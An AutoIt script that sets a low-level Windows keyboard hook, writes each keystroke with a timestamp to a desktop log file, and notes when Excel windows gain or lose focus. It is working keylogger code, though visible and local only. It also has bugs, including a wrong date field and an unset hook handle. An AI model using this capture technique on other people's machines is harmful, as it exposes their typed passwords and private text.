#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Outfile_x64=hello.exe
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <MsgBoxConstants.au3>
#include <StructureConstants.au3>
#include <WinAPI.au3>
#include <WindowsConstants.au3>
#include <FileConstants.au3>
#include <File.au3>
#include <Array.au3>

Dim $keyCodeArray
_FileReadToArray( "HELLO-KEYS.TXT", $keyCodeArray, 1, @TAB )

Opt( "WinTitleMatchMode", 2 )
OnAutoItExitRegister( "Cleanup" )

Local $fHdl
$fPth = ( @DesktopDir & "\Log.TXT" )
$fHdl = FileOpen( $fPth, $FO_APPEND )


Global $g_hHook, $g_hStub_KbdProc, $g_hStub_MseProc
Local $hMod

$g_hStub_KbdProc = DllCallbackRegister( "_KbdProc", "long", "int;wparam;lparam" )
; $g_hStub_MseProc = DllCallbackRegister( "_MseProc", "long", "int;wparam;lparam" )

$hMod = _WinAPI_GetModuleHandle( 0 )
$kbd_hHook = _WinAPI_SetWindowsHookEx( $WH_KEYBOARD_LL, DllCallbackGetPtr( $g_hStub_KbdProc ), $hMod )
; $mse_hHook = _WinAPI_SetWindowsHookEx( $WH_MOUSE_LL, DllCallbackGetPtr( $g_hStub_MseProc ), $hMod )

While ( True )

	WinWaitActive( "Microsoft Excel" )

	FileWrite( $fHdl, ( @CRLF & "Activate: Microsoft Excel" & " on " & timeStamp() & @CRLF ) )
	ConsoleWrite( @CRLF & "Activate: Microsoft Excel" & " on " & timeStamp() & @CRLF )

	Sleep( 10 )

	WinWaitNotActive( "Microsoft Excel" )

	FileWrite( $fHdl, ( @CRLF & "Deactivate: Microsoft Excel" & " on " & timeStamp() & @CRLF ) )
	ConsoleWrite( @CRLF & "Deactivate: Microsoft Excel" & " on " & timeStamp() & @CRLF )

WEnd


Func EvaluateKey( $iKeycode )

    If ( ( $iKeycode > 159 ) And ( $iKeycode < 164 ) ) Then

        Return

    ElseIf ( $iKeycode = 27 ) Then ; esc key

        Exit

    EndIf

EndFunc   ;==>EvaluateKey


; ===========================================================
; callback function
; ===========================================================

Func _KbdProc( $nCode, $wParam, $lParam )

    Local $tKEYHOOKS
    $tKEYHOOKS = DllStructCreate( $tagKBDLLHOOKSTRUCT, $lParam )

#comments-start
	If Not ( WinActive ( "Microsoft Excel" ) ) Then

		Return ;  _WinAPI_CallNextHookEx( $g_hHook, $nCode, $wParam, $lParam )

	ElseIf ( $nCode < 0 ) Then

        Return ;  _WinAPI_CallNextHookEx( $g_hHook, $nCode, $wParam, $lParam )

    EndIf
	#comments-end

    If ( $wParam = $WM_KEYDOWN ) Then

        EvaluateKey( DllStructGetData( $tKEYHOOKS, "vkCode" ) )

    Else

        Local $iFlags = DllStructGetData( $tKEYHOOKS, "flags" )
		Local $scanCode = DllStructGetData( $tKEYHOOKS, "scanCode" )
		Local $vkbdCode = DllStructGetData( $tKEYHOOKS, "vkCode" )
		Local $index = _ArraySearch( $keyCodeArray, $vkbdCode )
		Local $vkString = $keyCodeArray[ $index ][ 1 ]

        Switch $iFlags

            Case $LLKHF_ALTDOWN
                ConsoleWrite( "$LLKHF_ALTDOWN" & @CRLF )

            Case $LLKHF_EXTENDED
                ConsoleWrite( "$LLKHF_EXTENDED" & @CRLF )

            Case $LLKHF_INJECTED
                ConsoleWrite( "$LLKHF_INJECTED" & @CRLF )

            Case $LLKHF_UP
				FileWrite( $fHdl, ( $vkString & " on " & timeStamp() & @CRLF ) )
				ConsoleWrite( $vkString & " on " & timeStamp() & @CRLF )

			Case Else
				FileWrite( $fHdl, ( $vkString & " on " & timeStamp() & @CRLF ) )
				ConsoleWrite( $vkString & " on " & timeStamp() & @CRLF )

		EndSwitch

    EndIf

    Return _WinAPI_CallNextHookEx( $g_hHook, $nCode, $wParam, $lParam )

EndFunc   ;==>_KeyProcdadf

Func timeStamp()

	Return ( @YEAR & "-" & @MON & "-" & @YEAR & " at " & @HOUR & ":" & @MIN & ":" & @SEC & "." & @MSEC )

EndFunc

Func _MseProc( $nCode, $wParam, $lParam )

    ; Return _WinAPI_CallNextHookEx( $g_hHook, $nCode, $wParam, $lParam )

EndFunc    ;==>_MseProc


Func Cleanup()

    _WinAPI_UnhookWindowsHookEx( $g_hHook )
    DllCallbackFree( $g_hStub_KbdProc )

	FileClose( $fHdl )

EndFunc   ;==>Cleanup